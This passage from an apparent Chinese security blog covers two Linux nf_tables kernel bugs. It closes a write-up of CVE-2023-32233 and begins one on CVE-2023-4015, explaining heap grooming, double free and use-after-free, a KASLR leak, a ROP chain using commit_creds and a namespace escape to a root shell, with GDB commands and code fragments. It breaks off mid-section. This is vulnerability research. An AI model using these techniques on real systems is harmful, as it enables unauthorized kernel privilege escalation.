+<h1 id="背景知识介绍"><a href="#背景知识介绍" class="headerlink" title="背景知识介绍"></a>背景知识介绍</h1><h2 id="匿名集合-Anonymous-Sets"><a href="#匿名集合-Anonymous-Sets" class="headerlink" title="匿名集合 (Anonymous Sets)"></a>匿名集合 (Anonymous Sets)</h2><p>​	在 Linux Netfilter 的 <code>nf_tables</code> 框架中，集合（Set）用于存储数据以供规则高效匹配。匿名集合（带有 <code>NFT_SET_ANONYMOUS</code> 标志）通常作为规则中 <code>lookup</code> 等表达式的附属品自动生成。其生命周期理论上应与规则严格绑定：规则创建时增加引用计数，规则删除时减少引用。</p>
+<h1 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h1><p>​	漏洞根源于 <code>nf_tables_deactivate_set</code> 函数在事务准备阶段（<code>NFT_TRANS_PREPARE</code>）仅递减了引用计数 <code>set-&gt;use</code>，却未执行解绑（unbind）操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// net/netfilter/nf_tables_api.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">nf_tables_deactivate_set</span><span class="params">(..., <span class="keyword">enum</span> nft_trans_phase phase)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (phase) &#123;</span><br><span class="line">    <span class="keyword">case</span> NFT_TRANS_PREPARE:</span><br><span class="line">        <span class="built_in">set</span>-&gt;use--; <span class="comment">// 仅递减计数</span></span><br><span class="line">        <span class="keyword">return</span>;     <span class="comment">// 逻辑缺陷：未进行 unbind 便直接返回</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	这导致一个计数已归零、逻辑上应销毁的对象依然残留在全局链表中。通过在同一个 Batch 事务中精心编排“删除规则 -&gt; 显式删除集合”的操作序列，可以诱导内核对同一个物理对象执行两次销毁流程，从而将 UAF 演变为 Double Free。</p>
+<h1 id="漏洞利用过程详解"><a href="#漏洞利用过程详解" class="headerlink" title="漏洞利用过程详解"></a>漏洞利用过程详解</h1><p>​	CVE-2023-32233 的复现是一场精密的对象生命周期操纵艺术。在深入细节之前，下图展示了整个利用逻辑的核心路径，包括对象释放与抢占的顺序。</p>
+<p><img src="/image/vuln-logic-schematic.png" alt="漏洞利用逻辑示意图"></p>
+<p>​	我们通过 <code>exploit.c</code> 将这一艺术转化为稳定的提权原语。</p>
+<h2 id="1-基础环境构建与精准堆排布"><a href="#1-基础环境构建与精准堆排布" class="headerlink" title="1. 基础环境构建与精准堆排布"></a>1. 基础环境构建与精准堆排布</h2><p>​	利用的第一步是在内核中构建一个受控的 Netfilter 环境并进行精密的堆内存布局。CVE-2023-32233 的核心矛盾在于：当一个匿名集合（Anonymous Set）被规则引用时，虽然其生命周期应与规则绑定，但攻击者可以通过特定的批处理序列，在规则被标记删除后、集合正式解绑前，利用逻辑缺陷显式地触发集合的删除流程。</p>
+<p>​	为了实现这一目标，我们首先通过 <code>pwn_prepare</code> 函数建立 nftables 的逻辑框架。这包括创建一个独立的主表 <code>testfirewall</code>，并在其中定义两个关键链：<code>pwn_lookup_chain</code> (OUTPUT) 用于存放最初引用受害者集合的规则，而 <code>pwn_log_chain</code> (INPUT) 则预留给后续的堆喷射操作。这种分层隔离不仅条理清晰，更确保了漏洞触发过程不会干扰系统的正常网络功能，为后续的内存操作提供了一个稳定的“手术台”。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pwn_prepare</span><span class="params">(<span class="keyword">struct</span> mnl_socket *nl)</span> &#123;</span><br><span class="line">    pwn_create_table(batch, seq++); <span class="comment">// 创建实验主表</span></span><br><span class="line">    pwn_create_chain(batch, seq++, pwn_lookup_chain); <span class="comment">// 承载受害者规则</span></span><br><span class="line">    pwn_create_chain(batch, seq++, pwn_log_chain);    <span class="comment">// 用于后续对象喷射</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	在实际调试过程中，为了验证堆排布的效果并精确定位受害者集合 <code>s_a</code> 的内存地址，我们可以在内核源码的 <code>net/netfilter/nf_tables_api.c:6145</code> 处打入断点。这里的目的是为了观察 <code>elem.priv</code>，它指向了我们目标集合对应的 <code>nft_rhash_elem</code> 内容。通过 GDB 的输出可以看到，此时处理的正是我们预设的目标集合 “s_a”，这证实了基础环境构建的准确性。</p>
+<p><img src="/image/confirm-set-sa.png" alt="目标集合 s_a 的确认"></p>
+<p>​	紧随其后的是至关重要的堆整理（Heap Grooming）阶段。为了确保受害者对象落在可预测的内存位置并具备特定的溢出属性，我们执行 <code>pwn_uaf_spray</code> 函数。该函数通过循环喷射大量匿名集合来清理 SLUB 分配器的空闲列表（Freelist），迫使内核向伙伴系统申请全新的 Slab 页面。在这一喷射序列的中段，我们分配受害者集合 <code>s_a</code>（即代码中的 <code>pwn_lookup_set</code>）。此处的一个关键技巧是通过 <code>userdata</code> 将该对象的大小调整为 0x100 字节，使其精确落入 <code>kmalloc-256</code> 缓存池。</p>
+<p>​	为了深入观察这个匿名集合在后续 Double Free 过程中的状态变化，我们需要利用硬件断点进行精细监控。通过命令 <code>p &amp;set-&gt;ops</code> 获取 <code>ops</code> 指针格在内存中的绝对地址（例如 <code>0xffff888102bf74c0</code>），随后设置硬件监视点：<code>watch *0xffff888102bf74c0</code>。这样做是因为在触发漏洞时，受害者内存块会被释放并可能被另一个“竞争集合”（Race Set）占领。监控 <code>ops</code> 成员的变化，能够让我们在复杂的事务提交流程中，精准地捕捉到对象被重新占用或二次释放的瞬间。</p>
+<p><img src="/image/watchpoint-ops.png" alt="设置硬件断点监控 ops"></p>
+<p>​	环境准备的最后一步是通过 <code>pwn_create_lookup_rule</code> 创建一条引用 <code>s_a</code> 的 <code>lookup</code> 规则。此时，受害者集合 <code>s_a</code> 的引用计数（<code>use</code>）变为 1，它在逻辑上已正式成为规则的一部分。这一步是整个利用链条的“挂钩”点：只有建立了这种引用关系，我们才能在后续的事务处理中，利用 <code>nf_tables_deactivate_set</code> 函数的逻辑缺陷，强行触发对该集合的非法释放，从而打开通往 Use-After-Free 的大门。</p>
+<h2 id="2-操控时空：构造执行延迟-Manipulating-Time-The-Delay-Mechanism"><a href="#2-操控时空：构造执行延迟-Manipulating-Time-The-Delay-Mechanism" class="headerlink" title="2. 操控时空：构造执行延迟 (Manipulating Time: The Delay Mechanism)"></a>2. 操控时空：构造执行延迟 (Manipulating Time: The Delay Mechanism)</h2><p>​	单纯的并发竞争往往难以跨越微秒级的内核指令间隙，因此我们需要一种机制来人为地“拉伸”内核的执行时间。在攻击准备阶段，我们通过 <code>pwn_delay_spray_set_elem</code> 函数向一个名为 <code>set_delay</code> 的辅助集合中预先填充了海量元素（数量高达 <code>0x300 * 0x800</code>）。这个庞大的集合就像是一个蓄势待发的“时间锚”。</p>
+<p>​	当我们在后续的攻击事务中请求删除这个集合时，内核被迫陷入漫长的内存释放循环中，必须逐个清理这些元素。这个精心构造的“停顿”操作，就像是插入齿轮中的一根撬棍，强行将内核的处理流程卡滞在特定的事务提交阶段。这产生了长达数十毫秒的执行延迟，为用户态的后续操作赢得了宝贵的“子弹时间”，使得原本稍纵即逝的竞争条件变得稳定可控，让我们有足够的时间从容地进行堆内存的抢占与布局。</p>
+<h2 id="3-致命一击：触发-Double-Free-与对象重叠-Triggering-Double-Free-Object-Overlap"><a href="#3-致命一击：触发-Double-Free-与对象重叠-Triggering-Double-Free-Object-Overlap" class="headerlink" title="3. 致命一击：触发 Double Free 与对象重叠 (Triggering Double Free &amp; Object Overlap)"></a>3. 致命一击：触发 Double Free 与对象重叠 (Triggering Double Free &amp; Object Overlap)</h2><p>​	万事俱备，利用流程进入了最关键的阶段。在正式触发 Double Free 之前，通过 GDB 调试观察 <code>nft_rhash_elem</code> 的内容，可以进一步确认受害者集合 <code>s_a</code> 的内存排布。如下图所示，<code>elem.priv</code> 准确指向了我们的目标匿名集合。</p>
+<p><img src="/image/rhash-elem-content.png" alt="rhash elem 内容确认"></p>
+<p>​	接下来的核心挑战在于如何在两次释放的微小间隙中完成内存抢占。我们的策略是：在 <code>s_a</code> 被第一次释放后，立即通过另一个事务创建一个“竞争集合”（Race Set）。这里有一个极其精妙的设计：我们将 <code>race_set</code> 的名称（name）构造为一个大小属于 <code>kmalloc-cg-256</code> 的字符串。由于 <code>s_a</code> 刚刚被释放，内核分配器极大概率会将 <code>race_set-&gt;name</code> 分配到 <code>s_a</code> 原有的内存槽位上。通过在 <code>nf_tables_newset</code> 函数处设置断点，我们可以精准地捕捉到这个覆盖瞬间。</p>
+<p><img src="/image/debug-nf-tables-newset.png" alt="在 nf_tables_newset 处断点拦截"></p>
+<p>​	此时原本存放 <code>s_a</code> 结构体的空间已经被 <code>race_set</code> 的名称字符串所覆盖。为了进一步监控这块内存的变化，我们获取 <code>name</code> 的地址（例如 <code>0xffff888102af4f00</code>）并设置硬件监视点：<code>watch *0xffff888102af4f00</code>。当利用程序继续执行 <code>add chain</code> 操作时，这个监视点会被断下，此时正好处于 <code>memcpy</code> 用户数据（udata）到内核空间的时刻。</p>
+<p><img src="/image/watchpoint-memcpy-udata.png" alt="udata 拷贝时的硬件断点命中"></p>
+<p>​	执行 <code>finish</code> 结束 <code>memcpy</code> 后，观察内存状态可以清晰地看到原本的 <code>name</code> 字段已经被我们完全可控的 <code>chain-&gt;udata</code> 所填充。</p>
+<p><img src="/image/finish-memcpy-udata.png" alt="memcpy 执行完成后的内存状态"></p>
+<p>​	至此，受害者集合 <code>race_set</code> 的 <code>name</code> 指针已经变成了一个指向“幽灵内存”的悬垂指针，且该内存中的数据已被我们占位。</p>
+<p><img src="/image/udata-overlap-confirmed.png" alt="udata 覆盖确认"></p>
+<p>​	随后，漏洞逻辑触发了对 <code>s_a</code> 的第二次释放。由于之前的重叠，内核实际上释放的是 <code>race_set-&gt;name</code> 的内存。这就在 <code>kmalloc-cg-256</code> 缓存池中制造了一个空闲槽位。为了引入更具“价值”的对象——<code>nft_rule</code>，我们在这里执行了一个关键的步骤：**主动释放 <code>race_set</code>**。通过调用 <code>pwn_uaf_del_set</code>，内核会显式释放 <code>race_set-&gt;name</code>。由于物理地址重叠，这实际上将 <code>chain-&gt;udata</code> 所在的内存块再次放回了空闲列表。</p>
+<p><img src="/image/kmalloc-cg-256-chunks.png" alt="kmalloc-cg-256 中的内存块状态"></p>
+<p>​	接下来的目标是让 <code>nft_rule</code> 对象占领这个空位。由于 <code>nft_rule</code> 及其表达式（如 <code>counter</code>）同样使用该缓存池，我们可以通过喷射规则来触发占位。当内核执行到规则插入 RCU 链表的关键步骤时，新的规则对象已经精准地坐落在之前被释放的内存块上。</p>
+<p><img src="/image/rcu-list-insertion-rule.png" alt="规则对象精准占位"></p>
+<p>​	此时，利用进入了信息泄露阶段。通过 <code>NFT_MSG_GETCHAIN</code> 接口读取该链表的 <code>udata</code>，原本存放用户数据的内存中，现在赫然出现了 <code>nft_counter_ops</code> 的指针。通过解析这些数据，我们能够成功提取出这个内核符号地址，从而计算出内核基址（kbase），实现 KASLR 的完美绕过。</p>
+<p><img src="/image/leak-nft-counter-ops.png" alt="泄露出 nft_counter_ops 地址"></p>
+<p>​	下图展示了 <code>nft_rule</code> 及其内部 <code>nft_expr</code> 的具体布局，这也正是我们能够通过重叠内存读取到关键指针的原因。</p>
+<p><img src="/image/nft-rule-layout.png" alt="nft_rule 内存结构"><br><img src="/image/nft-expr-layout.png" alt="nft_expr 内存结构"></p>
+<h2 id="4-权力交接：劫持与提权-Precision-Hijack-Root-Shell"><a href="#4-权力交接：劫持与提权-Precision-Hijack-Root-Shell" class="headerlink" title="4. 权力交接：劫持与提权 (Precision Hijack &amp; Root Shell)"></a>4. 权力交接：劫持与提权 (Precision Hijack &amp; Root Shell)</h2><p>​	在成功获取内核基址与堆地址后，利用进入了最后的劫持阶段。这一阶段的核心在于通过再次的对象重叠，在内核中植入一个我们完全控制的“伪造对象”。</p>
+<p>​	我们利用泄露的信息，在用户态构造了一个精密的 ROP 链。整个提权逻辑如下：</p>
+<ol>
+<li><strong>定位 Init 进程</strong>：通过 <code>find_task_by_vpid(1)</code> 获取 init 进程的 <code>task_struct</code> 地址。</li>
+<li><strong>逃逸命名空间</strong>：调用 <code>switch_task_namespaces(init_task, &amp;init_nsproxy)</code>，将当前进程的命名空间切换回全局初始命名空间，从而绕过容器或沙箱限制。</li>
+<li><strong>获取 Root 权限</strong>：执行 <code>commit_creds(&amp;init_cred)</code>，将当前进程的凭证替换为系统管理员权限。</li>
+<li><strong>维持稳定</strong>：最后调用 <code>vfork()</code> 并进入一段长时间的延迟，以确保提权后的环境能够稳定运行。</li>
+</ol>
+<p>​	为了触发这个 ROP 链，我们利用 <code>pwn_uaf_spray_chain_fake_rule</code> 喷射一组精心构造的 <code>fake_nft_rule</code> 结构体。在这些伪造结构体中，我们篡改了操作钩子（Ops），将其指向一个关键的跳转 Gadget（如 <code>push rax ; pop rsp ; ret</code>），而 <code>rax</code> 此时正好指向我们布置好的 ROP 链。</p>
+<p>​	当一切准备就绪，我们只需发起一个 handle 为 <code>0xffff</code> 的删除规则请求。内核在遍历链表并尝试执行删除前的清理逻辑时，会毫无察觉地调用那个被篡改的指针。瞬间，内核栈被劫持到 ROP 链上，提权逻辑在内核态高速执行。随着 <code>win()</code> 函数在用户态被调用，一个具有 root 权限的 Shell 跃然屏上，宣告了这场内核生命周期操纵艺术的最终胜利。</p>
+<h1 id="补丁分析与总结"><a href="#补丁分析与总结" class="headerlink" title="补丁分析与总结"></a>补丁分析与总结</h1><p>​	官方补丁通过在 <code>nf_tables_deactivate_set</code> 中增加状态检查，确保了集合在引用计数归零时被正确解绑，从而堵住了这一逻辑漏洞。CVE-2023-32233 的复现过程不仅展示了 Netfilter 子系统中复杂的对象生命周期管理风险，更生动地演绎了如何通过精密的堆风水（Heap Feng Shui）和时间操控（Time Dilation），将一个看似受限的 UAF 漏洞转化为稳定的内核提权利器。这无疑是内核漏洞利用艺术的一次精彩展示。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/CVE-2023-4015/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="a2ure">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a2ure's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/02/07/CVE-2023-4015/" class="post-title-link" itemprop="url">Linux Netfilter 提权漏洞 (CVE-2023-4015) 复现与利用分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2026-02-07 10:20:00" itemprop="dateCreated datePublished" datetime="2026-02-07T10:20:00+08:00">2026-02-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2026-02-12 14:54:22" itemprop="dateModified" datetime="2026-02-12T14:54:22+08:00">2026-02-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>5.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>19 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="综合描述"><a href="#综合描述" class="headerlink" title="综合描述"></a>综合描述</h1><p>​	CVE-2023-4015 揭示了 Linux 内核 Netfilter (nf_tables) 子系统中一个极为精妙的逻辑设计缺陷。</p>
+<p>该漏洞的核心在于 nf_tables 在处理复杂的 Netlink 批处理事务时，未能正确维护对象在异常回滚过程中的引用状态。具体而言，当攻击者构造一个包含特定 immediate 表达式（用于实现跳转逻辑）的规则，并故意在同一事务中触发后续错误的路径时，内核会因为逻辑重叠而对同一个 nft_chain 对象执行两次去激活（Deactivate）操作。这种“双重去激活”直接导致了对象的引用计数（use count）异常归零，从而触发提前释放。</p>
+<p>​	由于内核在回滚（Abort）阶段的清理逻辑不够严谨，虽然对象在内存中已被释放回 SLUB 分配器，但先前建立的规则索引中依然保留着指向该内存地址的悬垂指针。这意味着攻击者可以通过后续的堆喷射（Heap Spraying）技术，将恶意构造的数据填入该内存坑位，从而实现类型混淆。在拥有 CAP_NET_ADMIN 权限的前提下（非特权用户可通过用户命名空间轻松获得此权限），该漏洞能够绕过 KASLR 等现代防御机制，最终实现从普通用户到 Root 权限的本地提权。这个漏洞不仅展示了逻辑漏洞在复杂事务模型中的隐蔽性，也再次证明了引用计数管理在内核安全中的关键地位。</p>
+<h1 id="背景知识介绍"><a href="#背景知识介绍" class="headerlink" title="背景知识介绍"></a>背景知识介绍</h1><h2 id="Netfilter-核心架构"><a href="#Netfilter-核心架构" class="headerlink" title="Netfilter 核心架构"></a>Netfilter 核心架构</h2><p>​	Netfilter 的 nf_tables 模块构建了一个高度层级化的对象管理体系。其核心对象包括 Table（表）、Chain（链）、Rule（规则）以及 Set（集合）和 Element（元素）。Table 作为最顶层的容器，包含了所有的链；Chain 则是规则的集合，通常与内核协议栈的钩子（Hook）点绑定；Rule 包含了具体的匹配表达式（Expression），负责实际的数据包处理逻辑。Set 和 Element 则提供了一种高效的键值匹配机制，允许规则在不线性遍历的情况下处理大量的 IP 地址或端口。这些对象之间通过引用计数相互链接，例如一个规则引用了一个跳转链，那么该链的引用计数就会增加，只有当所有引用都消失时，对象才能被安全释放。</p>
+<p><img src="/images/CVE-2023-4015/netfilter_arch.png" alt="netfilter_arch"></p>
+<h2 id="RCU-无锁机制与宽限期检测"><a href="#RCU-无锁机制与宽限期检测" class="headerlink" title="RCU 无锁机制与宽限期检测"></a>RCU 无锁机制与宽限期检测</h2><p>​	在 Linux 内核网络子系统中，为了兼顾高并发下的读取性能与数据一致性，广泛采用了 RCU（Read-Copy-Update）机制。RCU 的核心哲学在于“读者优先”，它允许多个读者在没有任何锁开销的情况下并发访问数据，而写者则通过“复制-修改-更新”的方式进行操作。当写者完成更新并切换全局指针后，旧的数据副本并不能立即释放，因为可能仍有读者正在引用它。此时，旧副本进入所谓的“宽限期”（Grace Period）。</p>
+<p>​	内核判断 RCU 读操作结束的标准是基于“静止状态”的检测。通过 <code>rcu_read_lock()</code> 和 <code>rcu_read_unlock()</code> 标记的临界区内禁止发生进程调度。因此，当每一个 CPU 都至少经历了一次上下文切换（Context Switch）或进入了 CPU 空闲状态（Idle），即意味着所有在宽限期开始前进入临界区的读者都已退出了读操作。此时，系统认为该 CPU 度过了一个“静止状态”（Quiescent State）。当全系统所有 CPU 都经历了静止状态，内核便可安全地物理释放旧内存。在 CVE-2023-4015 的利用中，理解这种逻辑释放（引用计数归零）与物理释放（宽限期结束）之间的时间差至关重要。</p>
+<p><img src="/images/CVE-2023-4015/nf_objects_desc.png" alt="nf_objects_desc"></p>
+<h2 id="nf-tables-事务处理模型"><a href="#nf-tables-事务处理模型" class="headerlink" title="nf_tables 事务处理模型"></a>nf_tables 事务处理模型</h2><p>​	为了保证规则更新的原子性和一致性，nf_tables 引入了基于 Netlink 的批处理事务处理逻辑（nft_trans）。这一机制模仿了数据库的“两阶段提交”：在 Preparation Phase（准备阶段），内核会解析用户发送的 Batch 消息，分配资源并验证参数，此时所有的更改都被记录在事务链表中而未真正生效；如果该阶段通过，则进入 Commit Phase（提交阶段）将更改原子性地应用到全局状态。</p>
+<p>​	如果中间任何一步出错，则会触发 Abort Phase（中止阶段），内核将遍历事务链表，按照相反的顺序撤销所有已记录的操作。这种事务处理在内核中是序列化的，通常在进程的上下文中执行，但对象的物理释放往往会延迟到 RCU 回调或特定的系统工作队列（workqueue）中异步完成。这种同步更新状态与异步释放内存的设计，正是 CVE-2023-4015 能够通过并发竞争和逻辑交织制造出 UAF 场景的架构基础。</p>
+<p><img src="/images/CVE-2023-4015/nft_transaction.png" alt="nft_transaction"></p>
+<h1 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h1><p>​	漏洞的深层诱因源于 <code>nf_tables_newrule</code> 函数在处理新规则创建失败时的错误清理路径，与后续事务中止（Abort）路径之间发生的逻辑碰撞。在内核解析 Netlink 消息创建规则的过程中，如果遇到参数非法或内存不足等错误，系统会立即跳转至错误处理标签 <code>err_release_rule</code>。在此处，内核会显式调用 <code>nft_rule_expr_deactivate</code> 并携带 <code>NFT_TRANS_PREPARE_ERROR</code> 标志，旨在撤销当前规则中已经部分解析的表达式对其他对象的引用。对于 <code>immediate</code> 类型的表达式，这不仅意味着要递减目标跳转链的引用计数，还会通过 <code>nf_tables_unbind_chain</code> 解除该链与当前规则的绑定关系。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">err_release_rule:</span><br><span class="line">  <span class="comment">// 第一次去激活：由 nf_tables_newrule 直接触发</span></span><br><span class="line">  nft_rule_expr_deactivate(&amp;ctx, rule, NFT_TRANS_PREPARE_ERROR);</span><br><span class="line">  nf_tables_rule_destroy(&amp;ctx, rule);</span><br></pre></td></tr></table></figure>
+
+<p>​	然而，由于该事务已经标记为失败，内核在完成局部的错误处理后，仍会不可避免地触发全局的 <code>__nf_tables_abort</code>。在该函数遍历事务链表处理 <code>NFT_MSG_NEWRULE</code> 类型的操作时，逻辑出现了致命偏差。由于目标链在之前的错误处理路径中已经执行了 <code>unbind</code> 操作，导致 <code>nft_trans_rule_bound</code> 的状态检查失效。于是，回滚逻辑会再一次、也是第二次对该规则调用 <code>nft_rule_expr_deactivate</code>，此时的阶段标志被设为 <code>NFT_TRANS_ABORT</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> NFT_MSG_NEWRULE:</span><br><span class="line">  <span class="keyword">if</span> (nft_trans_rule_bound(trans)) &#123; <span class="comment">// 状态位已在 Preparation 错误路径中被污染，导致检查跳过</span></span><br><span class="line">    nft_trans_destroy(trans);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 第二次去激活：导致目标 Chain 的引用计数产生 Underflow</span></span><br><span class="line">  nft_rule_expr_deactivate(&amp;trans-&gt;ctx, nft_trans_rule(trans), NFT_TRANS_ABORT);</span><br></pre></td></tr></table></figure>
+
+<p>​	这一系列动作导致目标跳转链（Victim Chain）的引用计数经历了两次连续的递减。如果我们构造一个初始引用计数为 1 的链，并在一次恶意事务中先通过规则引用它再人为制造错误，该链的引用计数会先降至 1（Preparation 报错），随后在 Abort 阶段降至 0。此时内核错误地认为该链已无人使用，从而将其物理释放。然而，我们的 <code>Base</code> 链中依然保留着指向这个已释放地址的规则索引，这就形成了一个稳定的 Use-After-Free 漏洞点。</p>
+<h1 id="漏洞利用过程详解"><a href="#漏洞利用过程详解" class="headerlink" title="漏洞利用过程详解"></a>漏洞利用过程详解</h1><h2 id="UAF触发"><a href="#UAF触发" class="headerlink" title="UAF触发"></a>UAF触发</h2><p>​	漏洞利用的第一步，也是最关键的一步，是精确控制目标对象的引用计数，使其在内核逻辑认为“已释放”的同时，我们手中仍持有指向它的有效引用。在 <code>trigger_uaf</code> 函数中，我们通过一系列精心编排的 Netlink 批处理事务（Batch Transactions）来实现这一目标。</p>
+<p>​	首先，我们需要在内核中建立三个关键的链：<code>c_free</code>（即 Victim，受害者链）、<code>c_primitive</code>（持有悬垂指针的 Base 链）以及 <code>c_spray</code>（用于后续堆喷射的占位链）。在代码中，我们特别将 <code>c_free</code> 的名称设置为全 ‘A’ 的长字符串，这是为了让它在后续被释放时能够落入特定的 <code>kmalloc-cg-192</code> 缓存池，方便我们进行堆喷射占位。通过第一个 Batch，我们完成了这些对象的创建，并添加了一条规则 <code>r_primitive</code>，让其通过 <code>immediate</code> 表达式引用 <code>c_free</code>。此时，如果我们通过调试器在 <code>nf_tables_addchain</code> 处下断点并观察，可以看到名为 ‘AAAA…’ 的 <code>c_free</code> 链已被成功创建。执行 <code>finish</code> 跳出函数后，可以清晰地观察到该受害链的内存结构信息，包括其地址以及当前的引用计数状态。下图中0xffff888102b3e300地址代表的是对应刚才通过ctx-&gt;chain获得的对应chain的地址，而0xffff888102b05300则是他的name指向的slab的内存区域也就是kmalloc-cg-192里面的地址。</p>
+<p><img src="/images/CVE-2023-4015/gdb_nf_tables_addchain.png" alt="gdb_nf_tables_addchain"></p>
+<p>​	接下来的操作是漏洞触发的核心。</p>
+<p>我们构造了一个包含两条新规则的恶意 Batch。第一条规则 <code>r_effect</code> 被添加到 <code>effect</code> 链中，它再次引用了 <code>c_free</code>。这一步在事务的 Preparation 阶段会将 <code>c_free</code> 的引用计数从 1 增加到 2。紧接着，我们在 <code>attack</code> 链中创建第二条规则 <code>r_attack</code>，它包含两个表达式：第一个引用合法的 <code>effect</code> 链，而第二个表达式则故意引用一个不存在的链 <code>some_invalid_chain</code>。这个不存在的链是整个逻辑陷阱的扳机，它将直接导致当前事务进入错误处理流程。</p>
+<p>​	当内核处理这个构造精巧的恶意 Batch 时，逻辑陷阱被成功触发。在处理 <code>r_attack</code> 规则时，由于引用的目标链不存在，内核立即抛出错误并进入 <code>NFT_TRANS_PREPARE_ERROR</code> 阶段。随后，内核开始回滚该 Batch 中已处理的规则，调用 <code>nft_immediate_deactivate</code> 来清理 <code>r_effect</code>。由于我们预先为 <code>c_effect</code> 链设置了 <code>NFT_CHAIN_BINDING</code> 标志，这一操作会触发递归解绑，导致受害者链 <code>c_free</code> 的引用计数从 2 递减至 1。然而，真正的致命一击发生在整个事务最终中止（Abort）的时刻。内核在执行 <code>__nf_tables_abort</code> 逻辑时，会再次遍历事务链表处理 <code>NFT_MSG_NEWRULE</code> 操作。由于先前的解绑逻辑未能在事务状态中留下完整标记，导致状态检查失效，回滚流程对 <code>r_effect</code> 发起了第二次去激活操作。至此，<code>c_free</code> 的引用计数再次递减，彻底归零。</p>
+<p>​	为了直观观察这一破坏过程，我们可以利用 GDB 设置条件断点：<code>b nf_tables_chain_destroy if ctx-&gt;chain == 0xffff888102b3e300</code>（地址需根据实际情况调整）。当我们在后续 Batch 中发送删除受害者链的指令时，断点会被触发。通过调试输出可以看到，在 <code>nf_tables_chain_destroy</code> 执行完毕后，原先存储 <code>c_free</code> 对象的内存区域已被破坏，原本清晰的 ‘AAAA…’ 名称指针位置现在充斥着内存回收后的脏数据，这标志着该内存块已正式返回 SLUB 分配器，成为了一个可被喷射占位的 UAF 坑位。</p>
+<p><img src="/images/CVE-2023-4015/gdb_chain_destroy_1.png" alt="gdb_chain_destroy_1"></p>
+<p><img src="/images/CVE-2023-4015/gdb_chain_destroy_2.png" alt="gdb_chain_destroy_2"></p>
+<p>​	现在，<code>c_free</code> 的引用计数已经归零，内核认为它不再被任何规则引用。于是，我们在下一个 Batch 中发送 <code>NFT_MSG_DELCHAIN</code> 命令来删除 <code>c_free</code>。内核执行删除操作后，那个全 ‘A’ 名称的 <code>c_free</code> 链所占用的内存被释放回 <code>kmalloc-cg-192</code> 缓存池。然而，我们在第一阶段创建的 <code>r_primitive</code> 规则依然静静地躺在内核中，它的 <code>immediate</code> 表达式仍然指向那个已经被释放的内存地址。至此，一个完美的 Use-After-Free 漏洞场景构建完成，我们通过 <code>r_primitive</code> 获得了一个通向内核堆内存深处的“后门”。</p>
+<h2 id="堆地址泄露-Heap-Leak"><a href="#堆地址泄露-Heap-Leak" class="headerlink" title="堆地址泄露 (Heap Leak)"></a>堆地址泄露 (Heap Leak)</h2><p>​	在成功制造了 UAF 之后，首要任务是泄露内核堆地址，为后续的利用铺平道路。<code>leak_heap</code> 函数的核心思想是利用堆喷射（Heap Spraying）技术，将一种我们可控的内核对象填入刚刚被释放的 <code>c_free</code> 内存坑位中。这里我们选择了 <code>nft_rule</code> 对象，因为它的大小可以通过附加表达式灵活调整，使其正好落入 <code>kmalloc-cg-192</code> 缓存池。</p>
